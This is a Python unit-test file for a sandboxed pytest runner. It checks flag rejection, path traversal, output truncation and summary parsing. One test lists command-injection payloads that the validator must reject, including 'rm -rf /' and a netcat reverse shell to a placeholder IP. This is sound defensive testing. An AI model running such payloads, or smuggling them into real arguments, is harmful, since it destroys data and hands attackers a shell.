"""
Unit Tests — Pytest Sandbox Runner
==================================
Verifies command allowlisting, argument validation, metacharacter rejection,
output bounding at 64KB, and deterministic summary parsing.
"""
import pytest

from src.core.errors import WorkflowExecutionError
from src.infrastructure.sandbox.pytest_runner import (
    PytestSandboxRunner,
    BASE_PYTEST_ARGV,
    MAX_OUTPUT_CHARS,
)


def test_build_command_default():
    cmd = PytestSandboxRunner.build_command()
    assert cmd == ["pytest", "-q", "--tb=short", "--no-header", "--capture=sys", "--maxfail=10"]


def test_build_command_with_safe_relative_path():
    cmd = PytestSandboxRunner.build_command("tests/unit/test_math.py")
    assert cmd == [
        "pytest",
        "-q",
        "--tb=short",
        "--no-header",
        "--capture=sys",
        "--maxfail=10",
        "tests/unit/test_math.py",
    ]


def test_build_command_rejects_flags():
    with pytest.raises(WorkflowExecutionError, match="cannot be a command-line flag"):
        PytestSandboxRunner.build_command("--import-mode=importlib")

    with pytest.raises(WorkflowExecutionError, match="cannot be a command-line flag"):
        PytestSandboxRunner.build_command("-s")


def test_build_command_rejects_shell_metacharacters():
    prohibited_payloads = [
        "tests/test_a.py; rm -rf /",
        "tests/test_a.py && whoami",
        "tests/test_a.py | grep fail",
        "tests/$(whoami).py",
        "tests/`id`.py",
        "tests/test_a.py > /tmp/pwn",
        "tests/test_a.py & nc -e /bin/sh 1.2.3.4 4444",
        "tests/test_a.py\nwhoami",
    ]
    for payload in prohibited_payloads:
        with pytest.raises(WorkflowExecutionError, match="illegal metacharacters"):
            PytestSandboxRunner.build_command(payload)


def test_build_command_rejects_directory_traversal():
    with pytest.raises(WorkflowExecutionError, match="traversal forbidden"):
        PytestSandboxRunner.build_command("../tests/test_math.py")


def test_bound_output_small():
    small_text = "5 passed in 0.12s\n"
    assert PytestSandboxRunner.bound_output(small_text) == small_text


def test_bound_output_truncates_at_64kb():
    huge_text = "A" * (MAX_OUTPUT_CHARS + 5000)
    bounded = PytestSandboxRunner.bound_output(huge_text)
    assert len(bounded) > MAX_OUTPUT_CHARS
    assert bounded.startswith("A" * MAX_OUTPUT_CHARS)
    assert "[OUTPUT TRUNCATED: Exceeded 64KB limit]" in bounded


def test_parse_pytest_summary_success():
    stdout = "...\n5 passed in 0.12s\n"
    total, passed, failed, skipped = PytestSandboxRunner.parse_pytest_summary(stdout)
    assert total == 5
    assert passed == 5
    assert failed == 0
    assert skipped == 0


def test_parse_pytest_summary_with_failures_and_skips():
    stdout = "F..s.\n3 passed, 2 failed, 1 skipped in 0.45s\n"
    total, passed, failed, skipped = PytestSandboxRunner.parse_pytest_summary(stdout)
    assert total == 6
    assert passed == 3
    assert failed == 2
    assert skipped == 1


def test_parse_pytest_summary_unparseable():
    stdout = "SyntaxError: invalid syntax at line 1\n"
    total, passed, failed, skipped = PytestSandboxRunner.parse_pytest_summary(stdout)
    assert total is None
    assert passed is None
    assert failed is None
    assert skipped is None
